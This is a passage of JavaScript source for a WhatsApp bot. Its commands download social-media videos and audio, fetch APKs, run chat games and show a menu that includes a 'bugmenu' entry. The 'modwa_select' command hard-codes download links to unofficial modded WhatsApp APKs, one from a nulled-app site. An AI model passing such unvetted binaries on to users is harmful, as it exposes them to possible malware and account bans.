      footer: 'Example: .ytmp4 https://www.youtube.com/watch?v=example'
    }, { quoted: m });
    return;
  }

  const youtubeRegex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/;
  if (!youtubeRegex.test(text)) {
    await VeranBotInc.sendMessage(m.chat, { text: '❌ Please provide a valid YouTube link.' }, { quoted: m });
    return;
  }

  // Ask user to select quality for MP4
  const button = [{
    name: 'single_select',
    buttonParamsJson: {
      title: `Select Quality for MP4`,
      sections: [{
        title: 'MP4 QUALITY OPTIONS',
        rows: [
          { title: 'Low (360p)', description: 'Low quality MP4', id: `${prefix}ytmp4_quality low ${text}` },
          { title: 'Medium (480p)', description: 'Medium quality MP4', id: `${prefix}ytmp4_quality medium ${text}` },
          { title: 'High (720p)', description: 'High quality MP4', id: `${prefix}ytmp4_quality high ${text}` }
        ]
      }]
    }
  }];

  // Send the button to user
  await VeranBotInc.sendButtonMsg(m.chat, '*Please select the MP4 quality:*', null, '*Choose one:*', null, button, m);
}
break;

case 'ytmp3_quality': {
    const commandArgs = text.split(' '); // Split the command text into arguments
    const quality = commandArgs[0]; // 'low', 'medium', 'high'
    const youtubeUrl = commandArgs[1]; // YouTube link

    try {
        const headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'https://tomp3.cc/en96j3f',
            'Origin': 'https://tomp3.cc',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
        };

        // Fetch video information
        const { data: { vid, links } } = await axios.post(
            'https://tomp3.cc/api/ajax/search?hl=en',
            new URLSearchParams({ query: youtubeUrl, vt: 'mp3' }),
            { headers }
        );

        console.log('Video Info (ytmp3_quality):', { vid, links }); // Log API response

        const qualityMap = { low: '64', medium: '192', high: '320' };
        const { k } = links.mp3[qualityMap[quality]];

        // Convert media
        const { data } = await axios.post(
            'https://tomp3.cc/api/ajax/convert?hl=en',
            new URLSearchParams({ vid, k }),
            { headers }
        );

        console.log('Conversion Response (ytmp3_quality):', data); // Log API conversion response

        if (!data || !data.dlink) {
            await VeranBotInc.sendMessage(m.chat, { text: '❌ Failed to retrieve MP3. Please try again.' }, { quoted: m });
            return;
        }

        const mp3Buffer = await fetchBuffer(data.dlink);
        await VeranBotInc.sendMessage(m.chat, {
            audio: mp3Buffer,
            mimetype: 'audio/mp4',
            fileName: `${data.title}.mp3`,
        });

    } catch (err) {
        console.error('Error processing ytmp3_quality command:', err.message); // Log error
        await VeranBotInc.sendMessage(m.chat, { text: '❌ An error occurred while processing the request. Please try again later.' }, { quoted: m });
    }
}
break;

case 'ytv': {
    if (!text) return replygcveran(`💡 *Example*: ${prefix + command} youtube_url`);
    if (!text.includes('youtu')) return replygcveran('🚫 The URL does not contain results from YouTube!');
    VeranStickWait();

    try {
        const response = await axios.get(`https://ytdl.giftedtech.workers.dev/?url=${text}`);
        const hasil = response.data;

        console.log('API Response (ytv):', hasil); // Log API response to the console

        if (hasil.status !== true || !hasil.result.mp4) {
            throw new Error('Error fetching video from the URL.');
        }

        // Prepare video details
        const { title, duration, timestamp, ago, views, name, channel, thumbnail, mp4 } = hasil.result;

        const caption = `*_DOWNLOADED BY VERAN-TECH-BOT_*\n\n
🎬 *Title*: _${title}_\n
⏱️ *Duration*: _${duration} seconds_\n
📅 *Uploaded*: _${ago}_\n
👁️ *Views*: _${views.toLocaleString()}_\n
👤 *Uploader*: _${name}_\n
🔗 *Channel*: _${channel}_\n\n
✨ *Enjoy your video!* 🎥\n🔥 *Powered by VERAN-TECH-BOT* 💻`;

        // Send video with caption
        await VeranBotInc.sendMessage(m.chat, {
            video: { url: mp4 },
            caption: caption,
            thumbnail: { url: thumbnail }
        }, { quoted: m });
    } catch (error) {
        console.error('Error in ytv command:', error); // Log error to the console
        replygcveran('⚠️ An error occurred while processing the video.');
    }
}
break;
            
case 'ytmp4_quality': {
    const commandArgs = text.split(' ');
    const quality = commandArgs[0];
    const youtubeUrl = commandArgs[1];

    try {
        const headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'https://tomp3.cc/en96j3f',
            'Origin': 'https://tomp3.cc',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
        };

        // Fetch video information
        const { data: { vid, links } } = await axios.post(
            'https://tomp3.cc/api/ajax/search?hl=en',
            new URLSearchParams({ query: youtubeUrl, vt: 'mp4' }),
            { headers }
        );

        console.log('Video Info (ytmp4_quality):', { vid, links }); // Log API response

        const qualityMap = { low: '133', medium: '135', high: '136' };
        const { k } = links.mp4[qualityMap[quality]];

        // Convert media
        const { data } = await axios.post(
            'https://tomp3.cc/api/ajax/convert?hl=en',
            new URLSearchParams({ vid, k }),
            { headers }
        );

        console.log('Conversion Response (ytmp4_quality):', data); // Log conversion response

        if (!data || !data.dlink) {
            await VeranBotInc.sendMessage(m.chat, { text: '❌ Failed to retrieve MP4. Please try again.' }, { quoted: m });
            return;
        }

const videoUrl = data.dlink;
const caption = `
📹 *YouTube Video Downloaded*

📂 *Title:* _${data.title}_
📅 *Duration:* _${data.duration} (${data.timestamp})_
⏳ *Uploaded:* _${data.ago}_
👀 *Views:* _${data.views}_
📺 *Channel:* _[${data.name}](${data.channel})_

*_DOWNLOADED BY VERAN-TECH-BOT_*\n\n
✨ *Enjoy your video!* 🎥\n🔥 *Powered by VERAN-TECH-BOT* 💻
        `;

        await VeranBotInc.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: caption
        }, { quoted: m });

    } catch (err) {
        console.error('Error processing ytmp4_quality command:', err.message); // Log error
        await VeranBotInc.sendMessage(m.chat, { text: '❌ An error occurred while processing the request. Please try again later.' }, { quoted: m });
    }
}
break;
      

case 'yta2': {
    if (!text) return replygcveran(`Example: ${prefix + command} youtube_url`);
    if (!text.includes('youtu')) return replygcveran('The URL does not contain results from YouTube!');
    VeranStickWait();
    
    const response = await axios.get(`https://ytdl.giftedtech.workers.dev/?url=${text}`);
    const hasil = response.data;

    if (hasil.status !== true || !hasil.result.mp3) {
        return replygcveran('Error fetching audio from the URL.');
    }

    await VeranBotInc.sendMessage(m.chat, {
        audio: { url: hasil.result.mp3 },
        mimetype: 'audio/mpeg'
    }, { quoted: m });
}
break;

                
case 'ytv2': {
    if (!text) return replygcveran(`💡 *Example*: ${prefix + command} youtube_url`);
    if (!text.includes('youtu')) return replygcveran('🚫 The URL does not contain results from YouTube!');
    VeranStickWait();

    try {
        const response = await axios.get(`https://ytdl.giftedtech.workers.dev/?url=${text}`);
        const hasil = response.data;

        console.log('API Response (ytv2):', hasil); // Log API response to the console

        if (hasil.status !== true || !hasil.result.mp4) {
            throw new Error('Error fetching video from the URL.');
        }

        // Prepare video details
        const { title, duration, timestamp, ago, views, name, channel, thumbnail, mp4 } = hasil.result;

        const caption = `*_DOWNLOADED BY VERAN-TECH-BOT_*\n\n
🎬 *Title*: _${title}_\n
⏱️ *Duration*: _${duration} seconds_\n
📅 *Uploaded*: _${ago}_\n
👁️ *Views*: _${views.toLocaleString()}_\n
👤 *Uploader*: _${name}_\n
🔗 *Channel*: _${channel}_\n\n
✨ *Enjoy your video!* 🎥\n🔥 *Powered by VERAN-TECH-BOT* 💻`;

        // Send video with caption
        await VeranBotInc.sendMessage(m.chat, {
            video: { url: mp4 },
            caption: caption,
            thumbnail: { url: thumbnail }
        }, { quoted: m });
    } catch (error) {
        console.error('Error in ytv2 command:', error); // Log error to the console
        replygcveran('⚠️ An error occurred while processing the video.');
    }
}
break;

      case 'apk': {
  try {
    if (command === 'apk') {
      if (!text) return replygcveran(`*[❗] Please provide the APK Name you want to download.*`);

      // Fetch APK data from the API
      let apiUrl = `${global.api}downloader/apk?apikey=${global.id}&q=${encodeURIComponent(text)}`;
      let response = await fetch(apiUrl);
      let data = await response.json();

      if (data.status !== 200) {
        return replygcveran(`*[❗] No results found for the APK Name you provided.*`);
      }

      let apkData = data.result;

      // Check if the file size is too large
      let sizeMB = parseFloat(apkData.size.replace(' MB', ''));
      if (sizeMB > 200) {
        return await VeranBotInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
      }

      // Send the APK file
      await VeranBotInc.sendMessage(
        m.chat,
        {
          document: { url: apkData.dllink },
          mimetype: 'application/vnd.android.package-archive',
          fileName: apkData.name + '.apk',
          caption: `*APK Name:* ${apkData.name}\n*Size:* ${apkData.size}\n*Last d:* ${apkData.lastup}`,
        },
        { quoted: m }
      );
    }
  } catch (error) {
    console.error(error);
    return replygcveran(`*[❗] An error occurred. Please try again later.*`);
  }
}
break;


case 'modwa': case 'modwhatsapp': {
  if (!isPremium) return replyprem(mess.premium)
  try {
    // Fetch mod data from the API
    let apiUrl = `${global.api}downloader/wamod?apikey=${global.id}`;
    let response = await fetch(apiUrl);
    let data = await response.json();

    if (data.status !== 200) {
      return replygcveran(`*[❗] No results found for the mod name you provided.*`);
    }

    // Generate buttons for each mod
    const button = [{
      name: 'single_select',
      buttonParamsJson: {
        title: 'SELECT 🌹',
        sections: [{
          title: 'WHATSAPP MODS',
          rows: [
            { title: 'GBWhatsApp', description: 'Download GBWhatsApp', id: `${prefix}modwa_select gbwa` },
            { title: 'WhatsApp Plus', description: 'Download WhatsApp Plus', id: `${prefix}modwa_select waplus` },
            { title: 'OGWhatsApp', description: 'Download OGWhatsApp', id: `${prefix}modwa_select ogwa` },
            { title: 'ANWhatsApp', description: 'Download ANWhatsApp', id: `${prefix}modwa_select anwa` },
            { title: 'FMWhatsApp', description: 'Download FMWhatsApp', id: `${prefix}modwa_select fmwa` },
            { title: 'YoWhatsApp', description: 'Download YoWhatsApp', id: `${prefix}modwa_select yowa` },
            { title: 'WhatsAero', description: 'Download WhatsAero', id: `${prefix}modwa_select aerowa` },
            { title: 'WhatsApp Gold', description: 'Download WhatsApp Gold', id: `${prefix}modwa_select goldwa` },
            { title: 'Karina WhatsApp', description: 'Download Karina WhatsApp', id: `${prefix}modwa_select karinawa` }
          ]
        }]
      }
    }];

    // Send the buttons to the user
    await VeranBotInc.sendButtonMsg(m.chat, 'Please select the WhatsApp mod you want to download:', null, 'Choose one:', null, button, m);
  } catch (error) {
    console.error(error);
    return replygcveran(`*[❗] An error occurred. Please try again later.*`);
  }
}
break;

case 'modwa_select': {
  try {
    const modName = text.split(' ')[0]; // Extract the mod name from the command
    const modData = {
      gbwa: "https://download2444.mediafire.com/bav6mdrs41vg0s3MIHTKMTYlvAaSRpBCCbGHAQ-c-hjQplzKcqBNHV-mcPSk2IY3IZUvjwRQBqkdrNqJmf5fBuVy9H9-9haNKGWqmeDhAbAzXmn5eqH1kX8m3L_4N19o7UvWOoyjkl0vpVzcDPvQK_PnNYpJw6GM7bn_1150zMYyhaeO/hs2h2jcqw393qvd/GBWhatsApp_Pro_v17.76.apk",
      waplus: "https://download2435.mediafire.com/su3jsxy7lmigblThAiSt7XKA1VJLbh07Q80SmNkfbtP9Blt0siFMCv3fUVKMips_HyaeULLIfC2G8BGY6fxL4g8XW8sXJOQMsb-qpPwB9mYWYS_A3DmljSWK6fsNlI6VA2Pt83_F56GY42n_uDqMFFE6jElziSvgwCxZM72-1VWItfVN/lb5m60dlj1gm03t/WhatsApp_Plus_v17.76.apk",
      ogwa: "https://download2448.mediafire.com/fyip44tzdyogy3Ra0iqGKDB0NQMTEMXCsYY8Kb6TjTKo8fAAyxJdBYCfWELO6vlkoVLkdKFmHrj7hD3aOll2jY0Lnez5LLz_4ypZLhqIfhT4Oa_HJ3KIq8QEWZwGAp6ZhMoKlD3jBpgK_Kvb_OuX_n1nnOluhMfiCLwXyG5tJDdiUqi7/v2n2xs6mw831yy2/OGWhatsApp_Pro_v17.76.apk",
      anwa: "https://files.smart5hone.com/Downloads/AN_V37/redirects.php?forward=https://files.smart5hone.com/apk/anwa/ANWhatsApp_V37.apk",
      fmwa: "https://cdn.fouadmod.com/apk/10.06/FMWA10.06@FouadMOD.com.apk",
      yowa: "https://apk-download.co/V1006/WA10.06@FouadMODS.apk",
      aerowa: "https://download.aeromods.app/AeroMods/WhatsAero/BETA/V9.93/H7dhs4/A_AERO_V9.93_BETA__--com_aero--__aeromods.app__.apk",
      goldwa: "https://files.smart5hone.com/Downloads/Gold_V30/redirects.php?forward=https://files.smart5hone.com/apk/plus/WhatsApp_Gold-V30.apk",
      karinawa: "https://eu2.contabostorage.com/ea5c648569af43439f47ab26502d20f5:butterfly/Karina-Official-Whatsapp-v14-(www.nulledandroid.com).apk"
    };

    const downloadLink = modData[modName];

    if (!downloadLink) {
      return replygcveran(`*[❗] Invalid mod name provided.*`);
    }

    // Send the mod download link
    await VeranBotInc.sendMessage(
      m.chat,
      {
        text: `*Mod Name:* ${modName}\n*Download Link:* ${downloadLink}`
      },
      { quoted: m }
    );
  } catch (error) {
    console.error(error);
    return replygcveran(`*[❗] An error occurred. Please try again later.*`);
  }
}
break;

case 'mega':{
	try {
if (!text) return replygcveran(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return replygcveran('Error: File size is too large (Maximum Size: 300MB)');
        const downloadingMessage = `🌩️ Downloading file... Please wait.`;
        replygcveran(downloadingMessage);
        const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await VeranBotInc.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return replygcveran(`Error: ${error.message}`);
    }
}
break
			case 'twitter': case 'twit': case 'X': {
	if (!args[0]) return replygcveran(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return replygcveran('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: te
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url:HD}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  	replygcveran(`Verify that the link is from Twitter`)
	}
}
break
			case 'fb':
           case 'facebook':
case 'facebookvid': {
           if (!args[0]) {
    return replygcveran(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replygcveran('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    VeranBotInc.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replygcveran('Maybe private video!')
  }
  }
  break
			case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return replygcveran(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return replygcveran(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return replygcveran(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: mediaURL}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
    } else if (mediaType === 'image') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: mediaURL}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
    }
  }
}
break
			case 'tiktok': case 'tiktokdown': case 'ttdown': case 'ttdl': case 'tt': case 'ttmp4': case 'ttvideo': case 'tiktokmp4': case 'tiktokvideo': {
				if (!text) return replygcveran(`Example: ${prefix + command} url_tiktok`)
				if (!text.includes('tiktok.com')) return replygcveran('Url Tidak Mengandung Result Dari Tiktok!')
				const hasil = await tiktokDl(text);
				VeranStickWait()
				if (hasil.size_nowm) {
					await VeranBotInc.sendFileUrl(m.chat, hasil.data[1].url, `*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m)
				} else {
					for (let i = 0; i < hasil.data.length; i++) {
						await VeranBotInc.sendFileUrl(m.chat, hasil.data[i].url, `*🚀Image:* ${i+1}`, m)
					}
				}
			}
			break
			case 'ttmp3': case 'tiktokmp3': case 'ttaudio': case 'tiktokaudio': {
				if (!text) return replygcveran(`Example: ${prefix + command} url_tiktok`)
				if (!text.includes('tiktok.com')) return replygcveran('Url Tidak Mengandung Result Dari Tiktok!')
				const hasil = await tiktokDl(text);
				VeranStickWait()
				await VeranBotInc.sendMessage(m.chat, {
					audio: { url: hasil.music_info.url },
					mimetype: 'audio/mpeg',
					contextInfo: {
						externalAdReply: {
							title: 'TikTok • ' + hasil.author.nickname,
							body: hasil.stats.likes + ' suka, ' + hasil.stats.comment + ' komentar. ' + hasil.title,
							previewType: 'PHOTO',
							thumbnailUrl: hasil.cover,
							mediaType: 1,
							renderLargerThumbnail: true,
							sourceUrl: text
						}
					}
				}, { quoted: m });
			}
			break
			
			// Fun Menu
			case 'dice': {
				let ddsa = [{ url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png', no: 1 },{ url: 'https://telegra.ph/file/797f86e444755282374ef.png', no: 2 },{ url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png', no: 3 },{ url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png', no: 4 },{ url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png', no: 5 },{ url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png', no: 6 }]
				let media = pickRandom(ddsa)
				await VeranBotInc.sendImageAsSticker(m.chat, media.url, m, { packname: global.packname, author: global.author, isAvatar: 1 })
			}
			break
			
			// Game Menu
			case 'slot': {
				await gameSlot(VeranBotInc, m, global.db.users)
			}
			break
			case 'casino': {
				await gameCasinoSolo(VeranBotInc, m, prefix, global.db.users)
			}
			break
			case 'robber': case 'rob': {
				await gameMerampok(m, global.db.users)
			}
			break
			case 'suitpvp': case 'suit': {
				let poin = 10
				let poin_lose = 10
				let timeout = 60000
				if (Object.values(game.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcveran(`Finish your previous suit`)
				if (m.mentionedJid[0] === m.sender) return replygcveran(`Can't play with myself !`)
				if (!m.mentionedJid[0]) return replygcveran(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[0]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
				if (Object.values(game.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcveran(`The person you are challenging is playing suit with someone else :(`)
				let id = 'suit_' + new Date() * 1
				let caption = `_*SUIT PvP*_\n\n@${m.sender.split`@`[0]} challenge @${m.mentionedJid[0].split`@`[0]} to play suits\n\nPlease @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
				game.suit[id] = {
					chat: replygcveran(caption),
					id: id,
					p: m.sender,
					p2: m.mentionedJid[0],
					status: 'wait',
					waktu: setTimeout(() => {
						if (game.suit[id]) replygcveran(`_Suit time is up_`)
						delete game.suit[id]
					}, 60000), poin, poin_lose, timeout
				}
			}
			break
			case 'ttc': case 'ttt': case 'tictactoe': {
				let TicTacToe = require('./lib/tictactoe');
				if (Object.values(game.tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcveran(`You are still in the game!\nType *${prefix}del${command}* If you want to end the session`);
				let room = Object.values(game.tictactoe).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
				if (room) {
					replygcveran('Partner found!')
					room.o = m.chat
					room.game.playerO = m.sender
					room.state = 'PLAYING'
					let arr = room.game.render().map(v => {
						return {X: '❌',O: '⭕',1: '1️⃣',2: '2️⃣',3: '3️⃣',4: '4️⃣',5: '5️⃣',6: '6️⃣',7: '7️⃣',8: '8️⃣',9: '9️⃣'}[v]
					})
					let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\nWaiting @${room.game.currentTurn.split('@')[0]}\n\nType *surrender* to give up and admit defeat`
					if (room.x !== room.o) await VeranBotInc.sendMessage(room.x, { texr: str, mentions: parseMention(str) }, { quoted: m })
					await VeranBotInc.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m })
				} else {
					room = {
						id: 'tictactoe-' + (+new Date),
						x: m.chat,
						o: '',
						game: new TicTacToe(m.sender, 'o'),
						state: 'WAITING',
						waktu: setTimeout(() => {
							if (game.tictactoe[roomnya.id]) replygcveran(`_Time ${command} finished_`)
							delete game.tictactoe[roomnya.id]
						}, 300000)
					}
					if (text) room.name = text
					VeranBotInc.sendMessage(m.chat, { text: 'Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''), mentions: m.mentionedJid }, { quoted: m })
					game.tictactoe[room.id] = room
				}
			}
			break
			case 'playbomb': case 'bomb': {
				if (game.tebakbom[m.sender]) return replygcveran('There Are Still Unfinished Sessions!')
				function shuffle(array) {
					return array.sort(() => Math.random() - 0.5);
				}
				game.tebakbom[m.sender] = {
					petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
					board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'],
					bomb: 3,
					lolos: 7,
					pick: 0,
					nyawa: ['❤️', '❤️', '❤️'],
					waktu: setTimeout(() => {
						if (game.tebakbom[m.sender]) replygcveran(`_Time ${command} finished_`)
						delete game.tebakbom[m.sender];
					}, 120000)
				}
				replygcveran(`*GUESS THE BOMB*\n\n${game.tebakbom[m.sender].board.join("")}\n\nChoose that number! and don't get hit by a bomb!\nBomb : ${game.tebakbom[m.sender].bomb}\nLife : ${game.tebakbom[m.sender].nyawa.join("")}`);
			}
			break
			case 'mathquiz': case 'math': {
				const { genMath, modes } = require('./lib/math');
const axios = require('axios');
				const inputMode = ['noob', 'easy', 'medium', 'hard','extreme','impossible','impossible2'];
				if (!text) return replygcveran(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
				if (!inputMode.includes(text.toLowerCase())) return replygcveran('Mode not found!')
				if (game.kuismath.hasOwnProperty(m.sender.split('@')[0])) return replygcveran('There Are Still Unfinished Sessions!')
				let result = await genMath(text.toLowerCase())
				replygcveran(`*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} detik`).then(() => {
					game.kuismath[m.sender.split('@')[0]] = {
						jawaban: result.jawaban,
						mode: text.toLowerCase()
					}
				})
				await sleep(result.waktu)
				if (game.kuismath.hasOwnProperty(m.sender.split('@')[0])) {
					replygcveran('Time has run out\nAnswer: ' + game.kuismath[m.sender.split('@')[0]].jawaban)
					delete game.kuismath[m.sender.split('@')[0]]
				}
			}
			break
			
			// Menu
		    case 'menu': case 'help': case 'vmenu': case 'v-menu': {
            const timestampe = speed()
            const latensie = speed() - timestampe
            const a = db.users[sender]
            const me = m.sender
			const xmenu_oh = `
╭──❍「 *VERAN-TECH-BOT* 」❍
├ *CREATOR* : *VERAN-TECH-HUB*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *MENU* 」❍
│${setv} ${prefix}*allmenu*
│${setv} ${prefix}*searchmenu*
│${setv} ${prefix}*downloadmenu*
│${setv} ${prefix}*gamemenu*
│${setv} ${prefix}*funmenu*
│${setv} ${prefix}*aimenu*
│${setv} ${prefix}*groupmenu*
│${setv} ${prefix}*ownermenu*
│${setv} ${prefix}*convertmenu*
│${setv} ${prefix}*listmenu*
│${setv} ${prefix}*religionmenu*
│${setv} ${prefix}*animemenu*
│${setv} ${prefix}*randomphotomenu*
│${setv} ${prefix}*randomvideomenu*
│${setv} ${prefix}*stickermenu*
│${setv} ${prefix}*databasemenu*
│${setv} ${prefix}*storemenu*
│${setv} ${prefix}*stalkermenu*
│${setv} ${prefix}*bugmenu*
│${setv} ${prefix}*othermenu*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
